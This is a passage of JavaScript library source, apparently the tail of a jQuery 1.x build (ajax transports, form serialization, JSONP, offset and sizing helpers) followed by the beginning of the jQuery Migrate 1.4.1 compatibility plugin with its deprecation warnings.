                y(-1, "No Transport");
            function y(b, c, d, e) {
                var k, s, t, v, x, y = c;
                2 !== u && (u = 2,
                h && a.clearTimeout(h),
                j = void 0,
                g = e || "",
                w.readyState = b > 0 ? 4 : 0,
                k = b >= 200 && 300 > b || 304 === b,
                d && (v = Wb(l, w, d)),
                v = Xb(l, v, w, k),
                k ? (l.ifModified && (x = w.getResponseHeader("Last-Modified"),
                x && (n.lastModified[f] = x),
                x = w.getResponseHeader("etag"),
                x && (n.etag[f] = x)),
                204 === b || "HEAD" === l.type ? y = "nocontent" : 304 === b ? y = "notmodified" : (y = v.state,
                s = v.data,
                t = v.error,
                k = !t)) : (t = y,
                !b && y || (y = "error",
                0 > b && (b = 0))),
                w.status = b,
                w.statusText = (c || y) + "",
                k ? p.resolveWith(m, [s, y, w]) : p.rejectWith(m, [w, y, t]),
                w.statusCode(r),
                r = void 0,
                i && o.trigger(k ? "ajaxSuccess" : "ajaxError", [w, l, k ? s : t]),
                q.fireWith(m, [w, y]),
                i && (o.trigger("ajaxComplete", [w, l]),
                --n.active || n.event.trigger("ajaxStop")))
            }
            return w
        },
        getJSON: function(a, b, c) {
            return n.get(a, b, c, "json")
        },
        getScript: function(a, b) {
            return n.get(a, void 0, b, "script")
        }
    }),
    n.each(["get", "post"], function(a, b) {
        n[b] = function(a, c, d, e) {
            return n.isFunction(c) && (e = e || d,
            d = c,
            c = void 0),
            n.ajax(n.extend({
                url: a,
                type: b,
                dataType: e,
                data: c,
                success: d
            }, n.isPlainObject(a) && a))
        }
    }),
    n._evalUrl = function(a) {
        return n.ajax({
            url: a,
            type: "GET",
            dataType: "script",
            cache: !0,
            async: !1,
            global: !1,
            "throws": !0
        })
    }
    ,
    n.fn.extend({
        wrapAll: function(a) {
            if (n.isFunction(a))
                return this.each(function(b) {
                    n(this).wrapAll(a.call(this, b))
                });
            if (this[0]) {
                var b = n(a, this[0].ownerDocument).eq(0).clone(!0);
                this[0].parentNode && b.insertBefore(this[0]),
                b.map(function() {
                    var a = this;
                    while (a.firstChild && 1 === a.firstChild.nodeType)
                        a = a.firstChild;
                    return a
                }).append(this)
            }
            return this
        },
        wrapInner: function(a) {
            return n.isFunction(a) ? this.each(function(b) {
                n(this).wrapInner(a.call(this, b))
            }) : this.each(function() {
                var b = n(this)
                  , c = b.contents();
                c.length ? c.wrapAll(a) : b.append(a)
            })
        },
        wrap: function(a) {
            var b = n.isFunction(a);
            return this.each(function(c) {
                n(this).wrapAll(b ? a.call(this, c) : a)
            })
        },
        unwrap: function() {
            return this.parent().each(function() {
                n.nodeName(this, "body") || n(this).replaceWith(this.childNodes)
            }).end()
        }
    });
    function Yb(a) {
        return a.style && a.style.display || n.css(a, "display")
    }
    function Zb(a) {
        if (!n.contains(a.ownerDocument || d, a))
            return !0;
        while (a && 1 === a.nodeType) {
            if ("none" === Yb(a) || "hidden" === a.type)
                return !0;
            a = a.parentNode
        }
        return !1
    }
    n.expr.filters.hidden = function(a) {
        return l.reliableHiddenOffsets() ? a.offsetWidth <= 0 && a.offsetHeight <= 0 && !a.getClientRects().length : Zb(a)
    }
    ,
    n.expr.filters.visible = function(a) {
        return !n.expr.filters.hidden(a)
    }
    ;
    var $b = /%20/g
      , _b = /\[\]$/
      , ac = /\r?\n/g
      , bc = /^(?:submit|button|image|reset|file)$/i
      , cc = /^(?:input|select|textarea|keygen)/i;
    function dc(a, b, c, d) {
        var e;
        if (n.isArray(b))
            n.each(b, function(b, e) {
                c || _b.test(a) ? d(a, e) : dc(a + "[" + ("object" == typeof e && null != e ? b : "") + "]", e, c, d)
            });
        else if (c || "object" !== n.type(b))
            d(a, b);
        else
            for (e in b)
                dc(a + "[" + e + "]", b[e], c, d)
    }
    n.param = function(a, b) {
        var c, d = [], e = function(a, b) {
            b = n.isFunction(b) ? b() : null == b ? "" : b,
            d[d.length] = encodeURIComponent(a) + "=" + encodeURIComponent(b)
        };
        if (void 0 === b && (b = n.ajaxSettings && n.ajaxSettings.traditional),
        n.isArray(a) || a.jquery && !n.isPlainObject(a))
            n.each(a, function() {
                e(this.name, this.value)
            });
        else
            for (c in a)
                dc(c, a[c], b, e);
        return d.join("&").replace($b, "+")
    }
    ,
    n.fn.extend({
        serialize: function() {
            return n.param(this.serializeArray())
        },
        serializeArray: function() {
            return this.map(function() {
                var a = n.prop(this, "elements");
                return a ? n.makeArray(a) : this
            }).filter(function() {
                var a = this.type;
                return this.name && !n(this).is(":disabled") && cc.test(this.nodeName) && !bc.test(a) && (this.checked || !Z.test(a))
            }).map(function(a, b) {
                var c = n(this).val();
                return null == c ? null : n.isArray(c) ? n.map(c, function(a) {
                    return {
                        name: b.name,
                        value: a.replace(ac, "\r\n")
                    }
                }) : {
                    name: b.name,
                    value: c.replace(ac, "\r\n")
                }
            }).get()
        }
    }),
    n.ajaxSettings.xhr = void 0 !== a.ActiveXObject ? function() {
        return this.isLocal ? ic() : d.documentMode > 8 ? hc() : /^(get|post|head|put|delete|options)$/i.test(this.type) && hc() || ic()
    }
    : hc;
    var ec = 0
      , fc = {}
      , gc = n.ajaxSettings.xhr();
    a.attachEvent && a.attachEvent("onunload", function() {
        for (var a in fc)
            fc[a](void 0, !0)
    }),
    l.cors = !!gc && "withCredentials"in gc,
    gc = l.ajax = !!gc,
    gc && n.ajaxTransport(function(b) {
        if (!b.crossDomain || l.cors) {
            var c;
            return {
                send: function(d, e) {
                    var f, g = b.xhr(), h = ++ec;
                    if (g.open(b.type, b.url, b.async, b.username, b.password),
                    b.xhrFields)
                        for (f in b.xhrFields)
                            g[f] = b.xhrFields[f];
                    b.mimeType && g.overrideMimeType && g.overrideMimeType(b.mimeType),
                    b.crossDomain || d["X-Requested-With"] || (d["X-Requested-With"] = "XMLHttpRequest");
                    for (f in d)
                        void 0 !== d[f] && g.setRequestHeader(f, d[f] + "");
                    g.send(b.hasContent && b.data || null),
                    c = function(a, d) {
                        var f, i, j;
                        if (c && (d || 4 === g.readyState))
                            if (delete fc[h],
                            c = void 0,
                            g.onreadystatechange = n.noop,
                            d)
                                4 !== g.readyState && g.abort();
                            else {
                                j = {},
                                f = g.status,
                                "string" == typeof g.responseText && (j.text = g.responseText);
                                try {
                                    i = g.statusText
                                } catch (k) {
                                    i = ""
                                }
                                f || !b.isLocal || b.crossDomain ? 1223 === f && (f = 204) : f = j.text ? 200 : 404
                            }
                        j && e(f, i, j, g.getAllResponseHeaders())
                    }
                    ,
                    b.async ? 4 === g.readyState ? a.setTimeout(c) : g.onreadystatechange = fc[h] = c : c()
                },
                abort: function() {
                    c && c(void 0, !0)
                }
            }
        }
    });
    function hc() {
        try {
            return new a.XMLHttpRequest
        } catch (b) {}
    }
    function ic() {
        try {
            return new a.ActiveXObject("Microsoft.XMLHTTP")
        } catch (b) {}
    }
    n.ajaxSetup({
        accepts: {
            script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"
        },
        contents: {
            script: /\b(?:java|ecma)script\b/
        },
        converters: {
            "text script": function(a) {
                return n.globalEval(a),
                a
            }
        }
    }),
    n.ajaxPrefilter("script", function(a) {
        void 0 === a.cache && (a.cache = !1),
        a.crossDomain && (a.type = "GET",
        a.global = !1)
    }),
    n.ajaxTransport("script", function(a) {
        if (a.crossDomain) {
            var b, c = d.head || n("head")[0] || d.documentElement;
            return {
                send: function(e, f) {
                    b = d.createElement("script"),
                    b.async = !0,
                    a.scriptCharset && (b.charset = a.scriptCharset),
                    b.src = a.url,
                    b.onload = b.onreadystatechange = function(a, c) {
                        (c || !b.readyState || /loaded|complete/.test(b.readyState)) && (b.onload = b.onreadystatechange = null,
                        b.parentNode && b.parentNode.removeChild(b),
                        b = null,
                        c || f(200, "success"))
                    }
                    ,
                    c.insertBefore(b, c.firstChild)
                },
                abort: function() {
                    b && b.onload(void 0, !0)
                }
            }
        }
    });
    var jc = []
      , kc = /(=)\?(?=&|$)|\?\?/;
    n.ajaxSetup({
        jsonp: "callback",
        jsonpCallback: function() {
            var a = jc.pop() || n.expando + "_" + Eb++;
            return this[a] = !0,
            a
        }
    }),
    n.ajaxPrefilter("json jsonp", function(b, c, d) {
        var e, f, g, h = b.jsonp !== !1 && (kc.test(b.url) ? "url" : "string" == typeof b.data && 0 === (b.contentType || "").indexOf("application/x-www-form-urlencoded") && kc.test(b.data) && "data");
        return h || "jsonp" === b.dataTypes[0] ? (e = b.jsonpCallback = n.isFunction(b.jsonpCallback) ? b.jsonpCallback() : b.jsonpCallback,
        h ? b[h] = b[h].replace(kc, "$1" + e) : b.jsonp !== !1 && (b.url += (Fb.test(b.url) ? "&" : "?") + b.jsonp + "=" + e),
        b.converters["script json"] = function() {
            return g || n.error(e + " was not called"),
            g[0]
        }
        ,
        b.dataTypes[0] = "json",
        f = a[e],
        a[e] = function() {
            g = arguments
        }
        ,
        d.always(function() {
            void 0 === f ? n(a).removeProp(e) : a[e] = f,
            b[e] && (b.jsonpCallback = c.jsonpCallback,
            jc.push(e)),
            g && n.isFunction(f) && f(g[0]),
            g = f = void 0
        }),
        "script") : void 0
    }),
    n.parseHTML = function(a, b, c) {
        if (!a || "string" != typeof a)
            return null;
        "boolean" == typeof b && (c = b,
        b = !1),
        b = b || d;
        var e = x.exec(a)
          , f = !c && [];
        return e ? [b.createElement(e[1])] : (e = ja([a], b, f),
        f && f.length && n(f).remove(),
        n.merge([], e.childNodes))
    }
    ;
    var lc = n.fn.load;
    n.fn.load = function(a, b, c) {
        if ("string" != typeof a && lc)
            return lc.apply(this, arguments);
        var d, e, f, g = this, h = a.indexOf(" ");
        return h > -1 && (d = n.trim(a.slice(h, a.length)),
        a = a.slice(0, h)),
        n.isFunction(b) ? (c = b,
        b = void 0) : b && "object" == typeof b && (e = "POST"),
        g.length > 0 && n.ajax({
            url: a,
            type: e || "GET",
            dataType: "html",
            data: b
        }).done(function(a) {
            f = arguments,
            g.html(d ? n("<div>").append(n.parseHTML(a)).find(d) : a)
        }).always(c && function(a, b) {
            g.each(function() {
                c.apply(this, f || [a.responseText, b, a])
            })
        }
        ),
        this
    }
    ,
    n.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], function(a, b) {
        n.fn[b] = function(a) {
            return this.on(b, a)
        }
    }),
    n.expr.filters.animated = function(a) {
        return n.grep(n.timers, function(b) {
            return a === b.elem
        }).length
    }
    ;
    function mc(a) {
        return n.isWindow(a) ? a : 9 === a.nodeType ? a.defaultView || a.parentWindow : !1
    }
    n.offset = {
        setOffset: function(a, b, c) {
            var d, e, f, g, h, i, j, k = n.css(a, "position"), l = n(a), m = {};
            "static" === k && (a.style.position = "relative"),
            h = l.offset(),
            f = n.css(a, "top"),
            i = n.css(a, "left"),
            j = ("absolute" === k || "fixed" === k) && n.inArray("auto", [f, i]) > -1,
            j ? (d = l.position(),
            g = d.top,
            e = d.left) : (g = parseFloat(f) || 0,
            e = parseFloat(i) || 0),
            n.isFunction(b) && (b = b.call(a, c, n.extend({}, h))),
            null != b.top && (m.top = b.top - h.top + g),
            null != b.left && (m.left = b.left - h.left + e),
            "using"in b ? b.using.call(a, m) : l.css(m)
        }
    },
    n.fn.extend({
        offset: function(a) {
            if (arguments.length)
                return void 0 === a ? this : this.each(function(b) {
                    n.offset.setOffset(this, a, b)
                });
            var b, c, d = {
                top: 0,
                left: 0
            }, e = this[0], f = e && e.ownerDocument;
            if (f)
                return b = f.documentElement,
                n.contains(b, e) ? ("undefined" != typeof e.getBoundingClientRect && (d = e.getBoundingClientRect()),
                c = mc(f),
                {
                    top: d.top + (c.pageYOffset || b.scrollTop) - (b.clientTop || 0),
                    left: d.left + (c.pageXOffset || b.scrollLeft) - (b.clientLeft || 0)
                }) : d
        },
        position: function() {
            if (this[0]) {
                var a, b, c = {
                    top: 0,
                    left: 0
                }, d = this[0];
                return "fixed" === n.css(d, "position") ? b = d.getBoundingClientRect() : (a = this.offsetParent(),
                b = this.offset(),
                n.nodeName(a[0], "html") || (c = a.offset()),
                c.top += n.css(a[0], "borderTopWidth", !0),
                c.left += n.css(a[0], "borderLeftWidth", !0)),
                {
                    top: b.top - c.top - n.css(d, "marginTop", !0),
                    left: b.left - c.left - n.css(d, "marginLeft", !0)
                }
            }
        },
        offsetParent: function() {
            return this.map(function() {
                var a = this.offsetParent;
                while (a && !n.nodeName(a, "html") && "static" === n.css(a, "position"))
                    a = a.offsetParent;
                return a || Qa
            })
        }
    }),
    n.each({
        scrollLeft: "pageXOffset",
        scrollTop: "pageYOffset"
    }, function(a, b) {
        var c = /Y/.test(b);
        n.fn[a] = function(d) {
            return Y(this, function(a, d, e) {
                var f = mc(a);
                return void 0 === e ? f ? b in f ? f[b] : f.document.documentElement[d] : a[d] : void (f ? f.scrollTo(c ? n(f).scrollLeft() : e, c ? e : n(f).scrollTop()) : a[d] = e)
            }, a, d, arguments.length, null)
        }
    }),
    n.each(["top", "left"], function(a, b) {
        n.cssHooks[b] = Ua(l.pixelPosition, function(a, c) {
            return c ? (c = Sa(a, b),
            Oa.test(c) ? n(a).position()[b] + "px" : c) : void 0
        })
    }),
    n.each({
        Height: "height",
        Width: "width"
    }, function(a, b) {
        n.each({
            padding: "inner" + a,
            content: b,
            "": "outer" + a
        }, function(c, d) {
            n.fn[d] = function(d, e) {
                var f = arguments.length && (c || "boolean" != typeof d)
                  , g = c || (d === !0 || e === !0 ? "margin" : "border");
                return Y(this, function(b, c, d) {
                    var e;
                    return n.isWindow(b) ? b.document.documentElement["client" + a] : 9 === b.nodeType ? (e = b.documentElement,
                    Math.max(b.body["scroll" + a], e["scroll" + a], b.body["offset" + a], e["offset" + a], e["client" + a])) : void 0 === d ? n.css(b, c, g) : n.style(b, c, d, g)
                }, b, f ? d : void 0, f, null)
            }
        })
    }),
    n.fn.extend({
        bind: function(a, b, c) {
            return this.on(a, null, b, c)
        },
        unbind: function(a, b) {
            return this.off(a, null, b)
        },
        delegate: function(a, b, c, d) {
            return this.on(b, a, c, d)
        },
        undelegate: function(a, b, c) {
            return 1 === arguments.length ? this.off(a, "**") : this.off(b, a || "**", c)
        }
    }),
    n.fn.size = function() {
        return this.length
    }
    ,
    n.fn.andSelf = n.fn.addBack,
    "function" == typeof define && define.amd && define("jquery", [], function() {
        return n
    });
    var nc = a.jQuery
      , oc = a.$;
    return n.noConflict = function(b) {
        return a.$ === n && (a.$ = oc),
        b && a.jQuery === n && (a.jQuery = nc),
        n
    }
    ,
    b || (a.jQuery = a.$ = n),
    n
});

/*!
 * jQuery Migrate - v1.4.1 - 2016-05-19
 * Copyright jQuery Foundation and other contributors
 */
(function(jQuery, window, undefined) {
    // See http://bugs.jquery.com/ticket/13335
    // "use strict";

    jQuery.migrateVersion = "1.4.1";

    var warnedAbout = {};

    // List of warnings already given; public read only
    jQuery.migrateWarnings = [];

    // Set to true to prevent console output; migrateWarnings still maintained
    // jQuery.migrateMute = false;

    // Show a message on the console so devs know we're active
    if (window.console && window.console.log) {
        window.console.log("JQMIGRATE: Migrate is installed" + (jQuery.migrateMute ? "" : " with logging active") + ", version " + jQuery.migrateVersion);
    }

    // Set to false to disable traces that appear with warnings
    if (jQuery.migrateTrace === undefined) {
        jQuery.migrateTrace = true;
    }

    // Forget any warnings we've already given; public
    jQuery.migrateReset = function() {
        warnedAbout = {};
        jQuery.migrateWarnings.length = 0;
    }
    ;

    function migrateWarn(msg) {
        var console = window.console;
        if (!warnedAbout[msg]) {
            warnedAbout[msg] = true;
            jQuery.migrateWarnings.push(msg);
            if (console && console.warn && !jQuery.migrateMute) {
                console.warn("JQMIGRATE: " + msg);
                if (jQuery.migrateTrace && console.trace) {
                    console.trace();
                }
            }
        }
    }

    function migrateWarnProp(obj, prop, value, msg) {
        if (Object.defineProperty) {
            // On ES5 browsers (non-oldIE), warn if the code tries to get prop;
            // allow property to be overwritten in case some other plugin wants it
            try {
                Object.defineProperty(obj, prop, {
                    configurable: true,
                    enumerable: true,
                    get: function() {
                        migrateWarn(msg);
                        return value;
                    },
                    set: function(newValue) {
                        migrateWarn(msg);
                        value = newValue;
                    }
                });
                return;
            } catch (err) {// IE8 is a dope about Object.defineProperty, can't warn there
            }
        }

        // Non-ES5 (or broken) browser; just set the property
        jQuery._definePropertyBroken = true;
        obj[prop] = value;
    }

    if (document.compatMode === "BackCompat") {
        // jQuery has never supported or tested Quirks Mode
        migrateWarn("jQuery is not compatible with Quirks Mode");
    }

    var attrFn = jQuery("<input/>", {
        size: 1
    }).attr("size") && jQuery.attrFn
      , oldAttr = jQuery.attr
      , valueAttrGet = jQuery.attrHooks.value && jQuery.attrHooks.value.get || function() {
        return null;
    }
      , valueAttrSet = jQuery.attrHooks.value && jQuery.attrHooks.value.set || function() {
        return undefined;
    }
      , rnoType = /^(?:input|button)$/i
      , rnoAttrNodeType = /^[238]$/
      , rboolean = /^(?:autofocus|autoplay|async|checked|controls|defer|disabled|hidden|loop|multiple|open|readonly|required|scoped|selected)$/i
      , ruseDefault = /^(?:checked|selected)$/i;

    // jQuery.attrFn
    migrateWarnProp(jQuery, "attrFn", attrFn || {}, "jQuery.attrFn is deprecated");

    jQuery.attr = function(elem, name, value, pass) {
        var lowerName = name.toLowerCase()
          , nType = elem && elem.nodeType;

        if (pass) {
            // Since pass is used internally, we only warn for new jQuery
            // versions where there isn't a pass arg in the formal params
            if (oldAttr.length < 4) {
                migrateWarn("jQuery.fn.attr( props, pass ) is deprecated");
            }
            if (elem && !rnoAttrNodeType.test(nType) && (attrFn ? name in attrFn : jQuery.isFunction(jQuery.fn[name]))) {
                return jQuery(elem)[name](value);
            }
        }

        // Warn if user tries to set `type`, since it breaks on IE 6/7/8; by checking
        // for disconnected elements we don't warn on $( "<button>", { type: "button" } ).
        if (name === "type" && value !== undefined && rnoType.test(elem.nodeName) && elem.parentNode) {
            migrateWarn("Can't change the 'type' of an input or button in IE 6/7/8");
        }

        // Restore boolHook for boolean property/attribute synchronization
        if (!jQuery.attrHooks[lowerName] && rboolean.test(lowerName)) {
            jQuery.attrHooks[lowerName] = {
                get: function(elem, name) {
                    // Align boolean attributes with corresponding properties
                    // Fall back to attribute presence where some booleans are not supported
                    var attrNode, property = jQuery.prop(elem, name);
                    return property === true || typeof property !== "boolean" && (attrNode = elem.getAttributeNode(name)) && attrNode.nodeValue !== false ?
                    name.toLowerCase() : undefined;
                },
                set: function(elem, value, name) {
                    var propName;
                    if (value === false) {
                        // Remove boolean attributes when set to false
                        jQuery.removeAttr(elem, name);
                    } else {
                        // value is true since we know at this point it's type boolean and not false
                        // Set boolean attributes to the same name and set the DOM property
                        propName = jQuery.propFix[name] || name;
                        if (propName in elem) {
                            // Only set the IDL specifically if it already exists on the element
                            elem[propName] = true;
                        }

                        elem.setAttribute(name, name.toLowerCase());
                    }
                    return name;
                }
            };

            // Warn only for attributes that can remain distinct from their properties post-1.9
            if (ruseDefault.test(lowerName)) {
                migrateWarn("jQuery.fn.attr('" + lowerName + "') might use property instead of attribute");
            }
        }

        return oldAttr.call(jQuery, elem, name, value);
    }
    ;

    // attrHooks: value
    jQuery.attrHooks.value = {
        get: function(elem, name) {
            var nodeName = (elem.nodeName || "").toLowerCase();
            if (nodeName === "button") {
                return valueAttrGet.apply(this, arguments);
            }
            if (nodeName !== "input" && nodeName !== "option") {
                migrateWarn("jQuery.fn.attr('value') no longer gets properties");
            }
            return name in elem ? elem.value : null;
        },
        set: function(elem, value) {
            var nodeName = (elem.nodeName || "").toLowerCase();
            if (nodeName === "button") {
                return valueAttrSet.apply(this, arguments);
            }
            if (nodeName !== "input" && nodeName !== "option") {
                migrateWarn("jQuery.fn.attr('value', val) no longer sets properties");
            }
            // Does not return so that setAttribute is also used
            elem.value = value;
        }
    };

    var matched, browser, oldInit = jQuery.fn.init, oldFind = jQuery.find, oldParseJSON = jQuery.parseJSON, rspaceAngle = /^\s*</, rattrHashTest = /\[(\s*[-\w]+\s*)([~|^$*]?=)\s*([-\w#]*?#[-\w#]*)\s*\]/, rattrHashGlob = /\[(\s*[-\w]+\s*)([~|^$*]?=)\s*([-\w#]*?#[-\w#]*)\s*\]/g, // Note: XSS check is done below after string is trimmed
    rquickExpr = /^([^<]*)(<[\w\W]+>)([^>]*)$/;

    // $(html) "looks like html" rule change
    jQuery.fn.init = function(selector, context, rootjQuery) {
        var match, ret;

        if (selector && typeof selector === "string") {
            if (!jQuery.isPlainObject(context) && (match = rquickExpr.exec(jQuery.trim(selector))) && match[0]) {

                // This is an HTML string according to the "old" rules; is it still?
                if (!rspaceAngle.test(selector)) {
                    migrateWarn("$(html) HTML strings must start with '<' character");
                }
                if (match[3]) {
                    migrateWarn("$(html) HTML text after last tag is ignored");
                }

                // Consistently reject any HTML-like string starting with a hash (gh-9521)
                // Note that this may break jQuery 1.6.x code that otherwise would work.
                if (match[0].charAt(0) === "#") {
                    migrateWarn("HTML string cannot start with a '#' character");
                    jQuery.error("JQMIGRATE: Invalid selector string (XSS)");
                }

                // Now process using loose rules; let pre-1.8 play too
                // Is this a jQuery context? parseHTML expects a DOM element (#178)
                if (context && context.context && context.context.nodeType) {
                    context = context.context;
                }

                if (jQuery.parseHTML) {
                    return oldInit.call(this, jQuery.parseHTML(match[2], context && context.ownerDocument || context || document, true), context, rootjQuery);
                }
            }
        }

        ret = oldInit.apply(this, arguments);

        // Fill in selector and context properties so .live() works
        if (selector && selector.selector !== undefined) {
            // A jQuery object, copy its properties
            ret.selector = selector.selector;
            ret.context = selector.context;

        } else {
            ret.selector = typeof selector === "string" ? selector : "";
            if (selector) {
                ret.context = selector.nodeType ? selector : context || document;
            }
        }

        return ret;
    }
    ;
    jQuery.fn.init.prototype = jQuery.fn;

    jQuery.find = function(selector) {
        var args = Array.prototype.slice.call(arguments);

        // Support: PhantomJS 1.x
        // String#match fails to match when used with a //g RegExp, only on some strings
        if (typeof selector === "string" && rattrHashTest.test(selector)) {

            // The nonstandard and undocumented unquoted-hash was removed in jQuery 1.12.0
            // First see if qS thinks it's a valid selector, if so avoid a false positive
            try {
                document.querySelector(selector);
            } catch (err1) {

                // Didn't *look* valid to qSA, warn and try quoting what we think is the value
                selector = selector.replace(rattrHashGlob, function(_, attr, op, value) {
                    return "[" + attr + op + "\"" + value + "\"]";
                });

                // If the regexp *may* have created an invalid selector, don't update it
                // Note that there may be false alarms if selector uses jQuery extensions
                try {
                    document.querySelector(selector);
                    migrateWarn("Attribute selector with '#' must be quoted: " + args[0]);
                    args[0] = selector;
                } catch (err2) {
                    migrateWarn("Attribute selector with '#' was not fixed: " + args[0]);
                }
            }
        }

        return oldFind.apply(this, args);
    }
    ;

    // Copy properties attached to original jQuery.find method (e.g. .attr, .isXML)
    var findProp;
    for (findProp in oldFind) {
        if (Object.prototype.hasOwnProperty.call(oldFind, findProp)) {
            jQuery.find[findProp] = oldFind[findProp];
        }
    }

    // Let $.parseJSON(falsy_value) return null
    jQuery.parseJSON = function(json) {
        if (!json) {
            migrateWarn("jQuery.parseJSON requires a valid JSON string");
            return null;
        }
        return oldParseJSON.apply(this, arguments);
    }
    ;

    jQuery.uaMatch = function(ua) {
        ua = ua.toLowerCase();

        var match = /(chrome)[ \/]([\w.]+)/.exec(ua) || /(webkit)[ \/]([\w.]+)/.exec(ua) || /(opera)(?:.*version|)[ \/]([\w.]+)/.exec(ua) || /(msie) ([\w.]+)/.exec(ua) || ua.indexOf("compatible") < 0 && /(mozilla)(?:.*? rv:([\w.]+)|)/.exec(ua) || [];

        return {
            browser: match[1] || "",
            version: match[2] || "0"
        };
    }
    ;

    // Don't clobber any existing jQuery.browser in case it's different
    if (!jQuery.browser) {
        matched = jQuery.uaMatch(navigator.userAgent);
        browser = {};

        if (matched.browser) {
            browser[matched.browser] = true;
            browser.version = matched.version;
        }

        // Chrome is Webkit, but Webkit is also Safari.
        if (browser.chrome) {
            browser.webkit = true;
        } else if (browser.webkit) {
            browser.safari = true;
        }

        jQuery.browser = browser;
    }

    // Warn if the code tries to get jQuery.browser
    migrateWarnProp(jQuery, "browser", jQuery.browser, "jQuery.browser is deprecated");

    // jQuery.boxModel deprecated in 1.3, jQuery.support.boxModel deprecated in 1.7
    jQuery.boxModel = jQuery.support.boxModel = (document.compatMode === "CSS1Compat");
    migrateWarnProp(jQuery, "boxModel", jQuery.boxModel, "jQuery.boxModel is deprecated");
    migrateWarnProp(jQuery.support, "boxModel", jQuery.support.boxModel, "jQuery.support.boxModel is deprecated");

    jQuery.sub = function() {
        function jQuerySub(selector, context) {
            return new jQuerySub.fn.init(selector,context);
        }
        jQuery.extend(true, jQuerySub, this);
        jQuerySub.superclass = this;
        jQuerySub.fn = jQuerySub.prototype = this();
        jQuerySub.fn.constructor = jQuerySub;
        jQuerySub.sub = this.sub;
        jQuerySub.fn.init = function init(selector, context) {
            var instance = jQuery.fn.init.call(this, selector, context, rootjQuerySub);
            return instance instanceof jQuerySub ? instance : jQuerySub(instance);
        }
        ;
        jQuerySub.fn.init.prototype = jQuerySub.fn;
        var rootjQuerySub = jQuerySub(document);
        migrateWarn("jQuery.sub() is deprecated");
        return jQuerySub;
    }
    ;

    // The number of elements contained in the matched element set
    jQuery.fn.size = function() {
        migrateWarn("jQuery.fn.size() is deprecated; use the .length property");
        return this.length;
    }
    ;

    var internalSwapCall = false;

    // If this version of jQuery has .swap(), don't false-alarm on internal uses
    if (jQuery.swap) {
        jQuery.each(["height", "width", "reliableMarginRight"], function(_, name) {
            var oldHook = jQuery.cssHooks[name] && jQuery.cssHooks[name].get;

            if (oldHook) {
                jQuery.cssHooks[name].get = function() {
                    var ret;

                    internalSwapCall = true;
                    ret = oldHook.apply(this, arguments);
                    internalSwapCall = false;
                    return ret;
                }
                ;
            }
        });
    }

    jQuery.swap = function(elem, options, callback, args) {
        var ret, name, old = {};

        if (!internalSwapCall) {
            migrateWarn("jQuery.swap() is undocumented and deprecated");
        }

        // Remember the old values, and insert the new ones
        for (name in options) {
            old[name] = elem.style[name];
            elem.style[name] = options[name];
        }

        ret = callback.apply(elem, args || []);

        // Revert the old values
        for (name in options) {
            elem.style[name] = old[name];
        }

        return ret;
    }
    ;

    // Ensure that $.ajax gets the new parseJSON defined in core.js
    jQuery.ajaxSetup({
        converters: {
            "text json": jQuery.parseJSON
        }
    });

    var oldFnData = jQuery.fn.data;

    jQuery.fn.data = function(name) {
        var ret, evt, elem = this[0];

        // Handles 1.7 which has this behavior and 1.8 which doesn't
        if (elem && name === "events" && arguments.length === 1) {
            ret = jQuery.data(elem, name);
            evt = jQuery._data(elem, name);
            if ((ret === undefined || ret === evt) && evt !== undefined) {
                migrateWarn("Use of jQuery.fn.data('events') is deprecated");
                return evt;
            }
        }
        return oldFnData.apply(this, arguments);
    }
    ;

    var rscriptType = /\/(java|ecma)script/i;

    // Since jQuery.clean is used internally on older versions, we only shim if it's missing
    if (!jQuery.clean) {
        jQuery.clean = function(elems, context, fragment, scripts) {
            // Set context per 1.8 logic
            context = context || document;
            context = !context.nodeType && context[0] || context;
            context = context.ownerDocument || context;

            migrateWarn("jQuery.clean() is deprecated");

            var i, elem, handleScript, jsTags, ret = [];

            jQuery.merge(ret, jQuery.buildFragment(elems, context).childNodes);

            // Complex logic lifted directly from jQuery 1.8
            if (fragment) {
                // Special handling of each script element
                handleScript = function(elem) {
                    // Check if we consider it executable
                    if (!elem.type || rscriptType.test(elem.type)) {
                        // Detach the script and store it in the scripts array (if provided) or the fragment
                        // Return truthy to indicate that it has been handled
                        return scripts ? scripts.push(elem.parentNode ? elem.parentNode.removeChild(elem) : elem) : fragment.appendChild(elem);
                    }
                }
                ;

                for (i = 0; (elem = ret[i]) != null; i++) {
                    // Check if we're done after handling an executable script
                    if (!(jQuery.nodeName(elem, "script") && handleScript(elem))) {
                        // Append to fragment and handle embedded scripts
                        fragment.appendChild(elem);
                        if (typeof elem.getElementsByTagName !== "undefined") {
                            // handleScript alters the DOM, so use jQuery.merge to ensure snapshot iteration
                            jsTags = jQuery.grep(jQuery.merge([], elem.getElementsByTagName("script")), handleScript);

                            // Splice the scripts into ret after their former ancestor and advance our index beyond them
                            ret.splice.apply(ret, [i + 1, 0].concat(jsTags));
                            i += jsTags.length;
                        }
                    }
                }
            }

            return ret;
        }
        ;
    }

    var eventAdd = jQuery.event.add
      , eventRemove = jQuery.event.remove
      , eventTrigger = jQuery.event.trigger
      , oldToggle = jQuery.fn.toggle
      , oldLive = jQuery.fn.live
      , oldDie = jQuery.fn.die
      , oldLoad = jQuery.fn.load
      , ajaxEvents = "ajaxStart|ajaxStop|ajaxSend|ajaxComplete|ajaxError|ajaxSuccess"
      , rajaxEvent = new RegExp("\\b(?:" + ajaxEvents + ")\\b")
      , rhoverHack = /(?:^|\s)hover(\.\S+|)\b/
      , hoverHack = function(events) {
        if (typeof (events) !== "string" || jQuery.event.special.hover) {
            return events;
        }
        if (rhoverHack.test(events)) {
            migrateWarn("'hover' pseudo-event is deprecated, use 'mouseenter mouseleave'");
        }
        return events && events.replace(rhoverHack, "mouseenter$1 mouseleave$1");
    };

    // Event props removed in 1.9, put them back if needed; no practical way to warn them
    if (jQuery.event.props && jQuery.event.props[0] !== "attrChange") {
        jQuery.event.props.unshift("attrChange", "attrName", "relatedNode", "srcElement");
    }

    // Undocumented jQuery.event.handle was "deprecated" in jQuery 1.7
    if (jQuery.event.dispatch) {
        migrateWarnProp(jQuery.event, "handle", jQuery.event.dispatch, "jQuery.event.handle is undocumented and deprecated");
    }

    // Support for 'hover' pseudo-event and ajax event warnings
    jQuery.event.add = function(elem, types, handler, data, selector) {
        if (elem !== document && rajaxEvent.test(types)) {
            migrateWarn("AJAX events should be attached to document: " + types);
        }
        eventAdd.call(this, elem, hoverHack(types || ""), handler, data, selector);
    }
    ;
    jQuery.event.remove = function(elem, types, handler, selector, mappedTypes) {
